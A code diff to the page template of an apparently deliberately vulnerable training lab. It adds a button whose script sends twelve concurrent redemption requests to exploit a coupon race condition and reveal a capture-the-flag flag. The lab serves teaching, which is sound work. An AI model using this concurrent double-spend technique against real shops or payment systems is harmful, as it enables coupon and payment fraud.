@@ -15,12 +15,38 @@
     <% if (flag) { %>
       <div class="lab-alert success">Double redemption detected! Flag: <span class="lab-flag"><%= flag %></span></div>
     <% } %>
-    <form method="POST" action="/labs/logic-coupon-race/redeem">
-      <button type="submit">Redeem Coupon</button>
-    </form>
+    <p class="lab-meta">The server performs a read-check-write with a delay. Fire many redemptions concurrently to spend the single use more than once.</p>
+    <button type="button" id="raceBtn">Launch concurrent redemptions</button>
+    <pre class="lab-code" id="raceResult" style="margin-top:0.8rem;">Not run yet.</pre>
   </div>
 
   <form method="POST" action="/labs/logic-coupon-race/reset"><button type="submit" class="secondary">Reset lab</button></form>
-
+</div>
+<script>
+  document.getElementById('raceBtn').addEventListener('click', async function () {
+    const button = this;
+    const out = document.getElementById('raceResult');
+    button.disabled = true;
+    out.textContent = 'Racing...';
+    try {
+      const requests = Array.from({ length: 12 }, () =>
+        fetch('/labs/logic-coupon-race/redeem', {
+          method: 'POST',
+          headers: { 'Content-Type': 'application/x-www-form-urlencoded' }
+        }).then(response => response.json())
+      );
+      const results = await Promise.all(requests);
+      const successes = results.filter(result => result.redeemed).length;
+      const flag = results.find(result => result.flag)?.flag || null;
+      out.textContent = JSON.stringify({ successes, results }, null, 2);
+      if (flag) out.textContent += '\n\nFLAG: ' + flag;
+      if (successes > 1) out.textContent += '\n\nRace condition reproduced. Reload the page to see the server-rendered flag.';
+    } catch (error) {
+      out.textContent = 'Race failed: ' + error.message;
+    } finally {
+      button.disabled = false;
+    }
+  });
+</script>
 </body>
 </html>
